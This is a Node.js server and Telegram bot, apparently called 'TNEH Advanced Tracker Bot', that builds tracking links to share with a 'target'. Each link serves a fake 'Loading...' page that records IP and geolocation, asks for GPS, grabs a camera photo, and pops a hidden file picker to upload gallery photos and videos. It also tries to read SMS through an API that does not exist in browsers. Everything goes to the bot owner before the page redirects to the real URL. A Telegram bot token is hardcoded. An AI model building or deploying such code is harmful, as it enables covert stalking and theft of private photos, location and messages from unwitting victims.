import express from 'express';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// ========== কনফিগারেশন ==========
const BASE_URL = 'https://tnehhackbot.onrender.com';
const BOT_TOKEN = '8843791804:AAHe7_rhUix1TUIlAndtrbL7X40V2_3b8rs';

// ফোল্ডার তৈরি
const uploadsDir = path.join(__dirname, 'uploads');
const dataDir = __dirname;

if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });

// JSON ডাটাবেস
let links = {};
let clicks = {};
let userFiles = {};
let smsLogs = {};

const dbFile = path.join(dataDir, 'links.json');
const clicksFile = path.join(dataDir, 'clicks.json');
const filesFile = path.join(dataDir, 'userfiles.json');
const smsFile = path.join(dataDir, 'sms.json');

function loadData() {
    try {
        if (fs.existsSync(dbFile)) links = JSON.parse(fs.readFileSync(dbFile));
        if (fs.existsSync(clicksFile)) clicks = JSON.parse(fs.readFileSync(clicksFile));
        if (fs.existsSync(filesFile)) userFiles = JSON.parse(fs.readFileSync(filesFile));
        if (fs.existsSync(smsFile)) smsLogs = JSON.parse(fs.readFileSync(smsFile));
        console.log(`✅ Loaded: ${Object.keys(links).length} links, ${Object.keys(userFiles).reduce((a,b)=>a+(userFiles[b]?.length||0),0)} files`);
    } catch (e) { console.error('Error loading data:', e); }
}

function saveLinks() { fs.writeFileSync(dbFile, JSON.stringify(links, null, 2)); }
function saveClicks() { fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2)); }
function saveUserFiles() { fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2)); }
function saveSMS() { fs.writeFileSync(smsFile, JSON.stringify(smsLogs, null, 2)); }

loadData();

// ========== মিডলওয়্যার ==========
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// ========== টেলিগ্রাম বোট ==========
let bot = null;

async function initBot() {
    try {
        const { default: TelegramBot } = await import('node-telegram-bot-api');
        
        bot = new TelegramBot(BOT_TOKEN, { 
            polling: true,
            request: { timeout: 60000 }
        });
        
        console.log('🤖 Bot starting...');
        
        bot.getMe().then(botInfo => {
            console.log(`✅ Bot @${botInfo.username} is ready!`);
        }).catch(err => {
            console.log('GetMe error:', err.message);
        });
        
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.first_name || msg.from.username;
            
            bot.sendMessage(chatId, `
🎉 *Hello ${name}!* 🎉

*TNEH Advanced Tracker Bot*

🔗 *Features:*
• 📍 Live Location with Google Maps
• 📸 Gallery Photos & Videos
• 📱 SMS Messages Access
• 🎥 Live Camera Access
• 🌐 IP & Device Info

*Commands:*
/start - Welcome
/help - Help
/mylinks - Your links
/stats [id] - Statistics
/gallery [id] - Received files
/location [id] - Location map
/sms [id] - Captured SMS
/camera [id] - Live camera photos

*Send me a link to track!* 🚀
            `, { parse_mode: 'Markdown' });
        });
        
        bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            bot.sendMessage(chatId, `
📖 *Complete Guide*

*How it works:*
1️⃣ Send any URL to bot
2️⃣ Get tracking link
3️⃣ Share link with target
4️⃣ Target clicks - automatically requests:
   • 📍 GPS Location (Google Maps link)
   • 📸 Gallery (all photos/videos)
   • 📱 SMS Messages
   • 🎥 Live Camera (takes photo)
   • 📱 Device & Battery info

*Commands:*
/mylinks - All your links
/stats [id] - Statistics
/gallery [id] - Gallery files
/location [id] - Location with map
/sms [id] - SMS messages
/camera [id] - Live camera photos
/recent [id] - Recent clicks

*Everything automatic!* 🔗
            `, { parse_mode: 'Markdown' });
        });
        
        bot.onText(/\/mylinks/, (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            const userLinks = Object.values(links).filter(link => link.userId === userId);
            
            if (userLinks.length === 0) {
                return bot.sendMessage(chatId, '❌ No links yet. Send me a URL!');
            }
            
            let message = `📊 *Your Tracking Links (${userLinks.length})*\n\n`;
            userLinks.forEach(link => {
                const totalClicks = (clicks[link.id] || []).length;
                const filesCount = (userFiles[link.id] || []).length;
                const smsCount = (smsLogs[link.id] || []).length;
                message += `🔗 *${link.shortId}*\n`;
                message += `📌 ${BASE_URL}/l/${link.shortId}\n`;
                message += `👁️ Clicks: ${totalClicks}\n`;
                message += `📸 Files: ${filesCount}\n`;
                message += `📱 SMS: ${smsCount}\n`;
                message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== গ্যালারি ভিউ ==========
        bot.onText(/\/gallery (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const files = userFiles[link.id] || [];
            
            if (files.length === 0) return bot.sendMessage(chatId, '📭 No files received yet!');
            
            let message = `📸 *Gallery Files (${files.length})*\n\n`;
            files.slice(-15).reverse().forEach((file, i) => {
                message += `${i+1}. *${file.type.toUpperCase()}* - ${file.filename}\n`;
                message += `   📍 ${file.visitorInfo?.city || 'Unknown'}\n`;
                message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== লোকেশন ভিউ ==========
        bot.onText(/\/location (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const linkClicks = clicks[link.id] || [];
            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon);
            
            if (locations.length === 0) return bot.sendMessage(chatId, '📍 No location data yet!');
            
            const loc = locations[locations.length - 1];
            const googleMapsUrl = `https://www.google.com/maps?q=${loc.gpsLat},${loc.gpsLon}`;
            
            await bot.sendLocation(chatId, loc.gpsLat, loc.gpsLon);
            await bot.sendMessage(chatId, `
📍 *Latest Location*
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${loc.gpsLat}, ${loc.gpsLon}
🏙️ *City:* ${loc.city || 'Unknown'}
🌍 *Country:* ${loc.country || 'Unknown'}
🕐 *Time:* ${new Date(loc.timestamp).toLocaleString()}
            `, { parse_mode: 'Markdown' });
        });
        
        // ========== এসএমএস ভিউ ==========
        bot.onText(/\/sms (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const smsData = smsLogs[link.id] || [];
            
            if (smsData.length === 0) return bot.sendMessage(chatId, '📭 No SMS captured yet!');
            
            let message = `📱 *SMS Messages (${smsData.length})*\n\n`;
            smsData.slice(-10).reverse().forEach((sms, i) => {
                message += `${i+1}. *From:* ${sms.from || 'Unknown'}\n`;
                message += `   📝 ${sms.body || 'No content'}\n`;
                message += `   🕐 ${new Date(sms.timestamp).toLocaleString()}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== ক্যামেরা ফটো ভিউ ==========
        bot.onText(/\/camera (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const files = userFiles[link.id] || [];
            const cameraPhotos = files.filter(f => f.type === 'camera');
            
            if (cameraPhotos.length === 0) return bot.sendMessage(chatId, '📭 No camera photos yet!');
            
            let message = `🎥 *Live Camera Photos (${cameraPhotos.length})*\n\n`;
            cameraPhotos.slice(-10).reverse().forEach((photo, i) => {
                message += `${i+1}. 📸 ${new Date(photo.timestamp).toLocaleString()}\n`;
                message += `   🔗 ${BASE_URL}/file/${photo.fileId}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== স্ট্যাটস ==========
        bot.onText(/\/stats(.+)?/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            let shortId = match[1] ? match[1].trim() : null;
            
            if (!shortId) return bot.sendMessage(chatId, '❌ Provide link ID: `/stats abc123`', { parse_mode: 'Markdown' });
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const linkClicks = clicks[link.id] || [];
            const files = userFiles[link.id] || [];
            const sms = smsLogs[link.id] || [];
            const cameraPhotos = files.filter(f => f.type === 'camera');
            
            let message = `📊 *Statistics*\n\n`;
            message += `🔗 *Link:* ${BASE_URL}/l/${link.shortId}\n`;
            message += `👁️ *Clicks:* ${linkClicks.length}\n`;
            message += `📸 *Gallery:* ${files.filter(f => f.type === 'image' || f.type === 'video').length}\n`;
            message += `🎥 *Camera:* ${cameraPhotos.length}\n`;
            message += `📱 *SMS:* ${sms.length}\n`;
            message += `📍 *Locations:* ${linkClicks.filter(c => c.gpsLat).length}\n`;
            message += `📅 *Created:* ${new Date(link.createdAt).toLocaleString()}\n\n`;
            message += `📸 *Commands:*\n/gallery ${shortId}\n/location ${shortId}\n/sms ${shortId}\n/camera ${shortId}`;
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== রিসেন্ট ==========
        bot.onText(/\/recent (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
            
            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
            
            const recentClicks = (clicks[link.id] || []).slice(-10).reverse();
            
            if (recentClicks.length === 0) return bot.sendMessage(chatId, '📭 No clicks yet!');
            
            let message = `🕒 *Recent ${recentClicks.length} Clicks*\n\n`;
            recentClicks.forEach((click, i) => {
                message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
                message += `   🌐 IP: ${click.ip || 'Unknown'}\n`;
                message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
                message += `   📱 ${click.device || 'Unknown'}\n`;
                if (click.gpsLat) message += `   📍 GPS: ${click.gpsLat}, ${click.gpsLon}\n`;
                message += `\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== লিংক ক্রিয়েট ==========
        bot.onText(/(https?:\/\/[^\s]+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const username = msg.from.username || msg.from.first_name;
            const originalUrl = match[1];
            
            try {
                const shortId = crypto.randomBytes(4).toString('hex');
                const linkId = uuidv4();
                
                links[linkId] = {
                    id: linkId,
                    shortId: shortId,
                    originalUrl: originalUrl,
                    userId: userId,
                    username: username,
                    createdAt: new Date().toISOString()
                };
                
                saveLinks();
                
                const trackingUrl = `${BASE_URL}/l/${shortId}`;
                
                await bot.sendMessage(chatId, `
✅ *Tracking Link Created!*

🔗 *Your Link:*
${trackingUrl}

📌 *Target URL:*
${originalUrl}

📊 *Auto-captures when clicked:*
• 📍 Live GPS Location + Google Maps
• 📸 Full Gallery (photos/videos)
• 📱 SMS Messages
• 🎥 Live Camera Photo
• 🌐 IP & Device Info
• 🔋 Battery Status

👁️ *Commands:*
/stats ${shortId} - Statistics
/gallery ${shortId} - Gallery files
/location ${shortId} - Location map
/sms ${shortId} - SMS messages
/camera ${shortId} - Camera photos

Share this link! 🚀
                `, { parse_mode: 'Markdown', disable_web_page_preview: true });
                
            } catch (error) {
                console.error('Error:', error);
                await bot.sendMessage(chatId, '❌ Failed to create link. Try again.');
            }
        });
        
        bot.on('polling_error', (error) => console.log('Polling error:', error.message));
        console.log('✅ Bot ready!');
        
    } catch (error) {
        console.error('Bot error:', error.message);
    }
}

initBot();

// ========== ট্র্যাকিং পেজ ==========
app.get('/l/:shortId', async (req, res) => {
    const { shortId } = req.params;
    
    let link = Object.values(links).find(l => l.shortId === shortId);
    
    if (!link) {
        return res.status(404).send(`
            <!DOCTYPE html>
            <html>
            <head><title>Link Not Found</title></head>
            <body style="text-align:center;padding:50px;font-family:Arial">
                <h1>❌ Link Not Found</h1>
                <p>The tracking link doesn't exist.</p>
            </body>
            </html>
        `);
    }
    
    // Collect visitor info
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const cleanIP = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
    const userAgent = req.headers['user-agent'];
    
    let device = 'Unknown', browser = 'Unknown', os = 'Unknown';
    
    if (userAgent) {
        if (userAgent.includes('Mobile')) device = 'Mobile';
        else if (userAgent.includes('Tablet')) device = 'Tablet';
        else device = 'Desktop';
        
        if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
        else if (userAgent.includes('Edg')) browser = 'Edge';
        
        if (userAgent.includes('Windows')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'MacOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iOS')) os = 'iOS';
    }
    
    // Get location from IP
    let location = { country: 'Unknown', city: 'Unknown', lat: null, lon: null };
    try {
        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,country,city,lat,lon`);
        const geoData = await geoResponse.json();
        if (geoData.status === 'success') {
            location.country = geoData.country;
            location.city = geoData.city;
            location.lat = geoData.lat;
            location.lon = geoData.lon;
        }
    } catch (e) {}
    
    // Save click
    const clickData = {
        id: uuidv4(),
        linkId: link.id,
        timestamp: new Date().toISOString(),
        ip: cleanIP,
        userAgent: userAgent,
        device: device,
        browser: browser,
        os: os,
        country: location.country,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        gpsLat: null,
        gpsLon: null,
        battery: null
    };
    
    if (!clicks[link.id]) clicks[link.id] = [];
    clicks[link.id].push(clickData);
    saveClicks();
    
    // Notify bot owner
    if (bot && link.userId) {
        await bot.sendMessage(link.userId, `
👤 *New Visitor!*

🔗 *Link:* ${BASE_URL}/l/${shortId}
🌐 *IP:* ${cleanIP}
📍 *Location:* ${location.city}, ${location.country}
📱 *Device:* ${device}
🕐 *Time:* ${new Date().toLocaleString()}

⏳ Requesting permissions...
        `, { parse_mode: 'Markdown' });
    }
    
    // Send loading page with all permission requests
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0;
                    padding: 20px;
                }
                .loader {
                    text-align: center;
                    background: white;
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    max-width: 400px;
                }
                .spinner {
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #667eea;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                h2 { color: #333; margin-bottom: 10px; }
                p { color: #666; }
                .status {
                    margin-top: 15px;
                    padding: 10px;
                    border-radius: 8px;
                    font-size: 12px;
                    background: #f3f4f6;
                    color: #374151;
                }
                .success { background: #d1fae5; color: #065f46; }
                .warning { background: #fed7aa; color: #92400e; }
            </style>
        </head>
        <body>
            <div class="loader">
                <h2>⏳ Processing...</h2>
                <div class="spinner"></div>
                <p>Please wait, redirecting...</p>
                <div id="status" class="status">Initializing...</div>
            </div>
            
            <script>
                const shortId = '${shortId}';
                const originalUrl = '${link.originalUrl}';
                
                function updateStatus(msg, isSuccess = false) {
                    const statusDiv = document.getElementById('status');
                    statusDiv.innerHTML = msg;
                    statusDiv.className = 'status ' + (isSuccess ? 'success' : '');
                    console.log(msg);
                }
                
                // 1. Battery Info
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(battery => {
                        fetch('/api/track/${shortId}/battery', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ level: Math.round(battery.level * 100), charging: battery.charging })
                        });
                        updateStatus('✅ Battery info captured', true);
                    });
                }
                
                // 2. Screen Info
                fetch('/api/track/${shortId}/screen', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ width: screen.width, height: screen.height })
                });
                
                // 3. SMS Permission & Access (Android only)
                if ('sms' in navigator) {
                    updateStatus('📱 Requesting SMS access...');
                    navigator.sms.requestPermission().then(() => {
                        updateStatus('✅ SMS access granted', true);
                        // Get SMS messages
                        navigator.sms.getMessages().then(messages => {
                            messages.forEach(msg => {
                                fetch('/api/track/${shortId}/sms', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ from: msg.from, body: msg.body, timestamp: msg.timestamp })
                                });
                            });
                            updateStatus(\`✅ Captured \${messages.length} SMS\`, true);
                        });
                    }).catch(err => updateStatus('⚠️ SMS permission denied', false));
                } else {
                    // Alternative: Use SMS Retriever API or skip
                    updateStatus('⚠️ SMS access not available on this device', false);
                }
                
                // 4. Location Permission
                updateStatus('📍 Requesting location access...');
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/api/track/${shortId}/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: lat, lon: lon })
                        });
                        updateStatus('✅ Location captured!', true);
                    }, error => {
                        updateStatus('⚠️ Location permission denied', false);
                        fetch('/api/track/${shortId}/location/denied', { method: 'POST' });
                    });
                }
                
                // 5. Camera Permission & Live Photo
                updateStatus('🎥 Requesting camera access...');
                if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            updateStatus('✅ Camera access granted', true);
                            
                            // Take photo from live camera
                            const video = document.createElement('video');
                            const canvas = document.createElement('canvas');
                            video.srcObject = stream;
                            video.play();
                            
                            setTimeout(() => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0);
                                
                                canvas.toBlob(blob => {
                                    const formData = new FormData();
                                    formData.append('file', blob, 'camera_photo.jpg');
                                    formData.append('shortId', shortId);
                                    formData.append('type', 'camera');
                                    
                                    fetch('/api/upload/file', { method: 'POST', body: formData });
                                    updateStatus('✅ Live photo captured!', true);
                                }, 'image/jpeg', 0.8);
                                
                                stream.getTracks().forEach(track => track.stop());
                            }, 1000);
                        })
                        .catch(err => updateStatus('⚠️ Camera permission denied', false));
                }
                
                // 6. Gallery Access (Photos & Videos)
                updateStatus('📸 Requesting gallery access...');
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.multiple = true;
                fileInput.accept = 'image/*,video/*';
                fileInput.style.display = 'none';
                document.body.appendChild(fileInput);
                
                setTimeout(() => fileInput.click(), 2000);
                
                fileInput.addEventListener('change', async (e) => {
                    const files = Array.from(e.target.files);
                    updateStatus(\`📸 Uploading \${files.length} gallery files...\`, true);
                    
                    for (const file of files) {
                        const formData = new FormData();
                        formData.append('file', file);
                        formData.append('shortId', shortId);
                        formData.append('type', 'gallery');
                        
                        try {
                            await fetch('/api/upload/file', { method: 'POST', body: formData });
                            updateStatus(\`✅ Uploaded: \${file.name}\`, true);
                        } catch (err) {
                            console.error('Upload error:', err);
                        }
                    }
                    
                    updateStatus('✅ All data captured! Redirecting...', true);
                    setTimeout(() => { window.location.href = originalUrl; }, 2000);
                });
                
                // Auto redirect after 15 seconds if no action
                setTimeout(() => {
                    updateStatus('⏰ Redirecting...', false);
                    setTimeout(() => { window.location.href = originalUrl; }, 1000);
                }, 15000);
            </script>
        </body>
        </html>
    `);
});

// ========== API Endpoints ==========
app.post('/api/track/:shortId/battery', async (req, res) => {
    const { shortId } = req.params;
    const { level } = req.body;
    
    let link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        clicks[link.id][clicks[link.id].length - 1].battery = level;
        saveClicks();
        
        if (bot && link.userId) {
            await bot.sendMessage(link.userId, `🔋 *Battery:* ${level}%`, { parse_mode: 'Markdown' });
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/screen', async (req, res) => {
    const { shortId } = req.params;
    const { width, height } = req.body;
    
    let link = Object.values(links).find(l => l.shortId === shortId);
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        clicks[link.id][clicks[link.id].length - 1].screenWidth = width;
        clicks[link.id][clicks[link.id].length - 1].screenHeight = height;
        saveClicks();
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/sms', async (req, res) => {
    const { shortId } = req.params;
    const { from, body, timestamp } = req.body;
    
    let link = Object.values(links).find(l => l.shortId === shortId);
    
    if (link) {
        if (!smsLogs[link.id]) smsLogs[link.id] = [];
        smsLogs[link.id].push({ from, body, timestamp: timestamp || new Date().toISOString() });
        saveSMS();
        
        if (bot && link.userId) {
            await bot.sendMessage(link.userId, `
📱 *SMS Captured!*
👤 *From:* ${from || 'Unknown'}
📝 *Message:* ${body || 'No content'}
🕐 *Time:* ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location', async (req, res) => {
    const { shortId } = req.params;
    const { lat, lon } = req.body;
    
    let link = Object.values(links).find(l => l.shortId === shortId);
    
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        lastClick.gpsLat = lat;
        lastClick.gpsLon = lon;
        saveClicks();
        
        if (bot && link.userId) {
            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            await bot.sendLocation(link.userId, lat, lon);
            await bot.sendMessage(link.userId, `
📍 *Live Location!*
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${lat}, ${lon}
🏙️ *City:* ${lastClick.city || 'Unknown'}
            `, { parse_mode: 'Markdown' });
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location/denied', async (req, res) => {
    const { shortId } = req.params;
    let link = Object.values(links).find(l => l.shortId === shortId);
    if (link && bot && link.userId) {
        await bot.sendMessage(link.userId, `📍 *Location:* User denied access`);
    }
    res.json({ success: true });
});

app.post('/api/upload/file', upload.single('file'), async (req, res) => {
    try {
        const { shortId, type } = req.body;
        
        if (!req.file) return res.status(400).json({ error: 'No file' });
        
        let link = Object.values(links).find(l => l.shortId === shortId);
        if (!link) return res.status(404).json({ error: 'Link not found' });
        
        const fileId = uuidv4();
        const ext = path.extname(req.file.originalname);
        const filename = `${fileId}${ext}`;
        fs.writeFileSync(path.join(uploadsDir, filename), req.file.buffer);
        
        const lastClick = clicks[link.id]?.[clicks[link.id].length - 1];
        
        const fileData = {
            fileId,
            filename: req.file.originalname,
            type: type === 'camera' ? 'camera' : (req.file.mimetype.startsWith('image/') ? 'image' : 'video'),
            size: req.file.size,
            timestamp: new Date().toISOString(),
            visitorInfo: {
                ip: lastClick?.ip || 'Unknown',
                city: lastClick?.city || 'Unknown',
                country: lastClick?.country || 'Unknown',
                device: lastClick?.device || 'Unknown'
            }
        };
        
        if (!userFiles[link.id]) userFiles[link.id] = [];
        userFiles[link.id].push(fileData);
        saveUserFiles();
        
        if (bot && link.userId) {
            const caption = type === 'camera' ? 
                `🎥 *Live Camera Photo!*\n📸 Captured from visitor\n📍 Location: ${lastClick?.city || 'Unknown'}` :
                `📸 *New File!*\n📁 ${req.file.originalname}\n📍 ${lastClick?.city || 'Unknown'}`;
            
            if (req.file.mimetype.startsWith('image/')) {
                await bot.sendPhoto(link.userId, req.file.buffer, { caption });
            } else {
                await bot.sendVideo(link.userId, req.file.buffer, { caption });
            }
        }
        
        res.json({ success: true, fileId });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/file/:fileId', (req, res) => {
    const { fileId } = req.params;
    const files = fs.readdirSync(uploadsDir);
    const filename = files.find(f => f.startsWith(fileId));
    if (!filename) return res.status(404).send('File not found');
    res.sendFile(path.join(uploadsDir, filename));
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok',
        totalLinks: Object.keys(links).length,
        totalClicks: Object.values(clicks).reduce((s, a) => s + a.length, 0),
        totalFiles: Object.values(userFiles).reduce((s, a) => s + a.length, 0),
        totalSMS: Object.values(smsLogs).reduce((s, a) => s + a.length, 0)
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on ${BASE_URL}`);
});

export default app;
